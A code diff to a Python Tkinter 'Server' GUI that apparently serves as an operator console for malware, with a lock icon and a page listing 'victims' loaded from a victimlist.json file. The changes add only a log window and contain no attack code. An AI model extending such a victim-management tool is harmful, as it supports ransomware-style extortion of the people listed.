@@ -29,7 +29,7 @@ def styles():
                     width=800)
 
 def windowInit():
-    global root
+    global root,log
     root = tk.Tk()
     root.title("Server")
     root.iconbitmap("./images/lock.ico")
@@ -37,6 +37,13 @@ def windowInit():
     width, height, x, y = 900, 400, pyautogui.size().width // 2, pyautogui.size().height // 2
     root.geometry(f"{width}x{height}+{x-width//2}+{y-height//2}")
     root.resizable(False, False)
+
+    log = tk.Tk()
+    log.title("Log")
+    log.configure(bg="#282626")
+    width, height, x, y = 300, 700, pyautogui.size().width // 1.2, pyautogui.size().height // 2
+    log.geometry(f"{width}x{height}+{int(x)-width//2}+{y-height//2}")
+    log.resizable(False, False)
 
     menuBar()
     victimListPage()
@@ -55,7 +62,7 @@ def clearWindow():
 def victimListPage():
     def treeview():
         def dataRefresh():
-            testPath,rmfolderPath = "./data/victimlist.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
+            testPath,__rmfolderPath = "./data/victimlist.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
             for item in tree.get_children():
                 tree.delete(item)
 
@@ -122,6 +129,7 @@ def run():
     windowInit()
     styles()
     root.mainloop()
+    log.mainloop()
 
 if __name__ == "__main__":
     run()
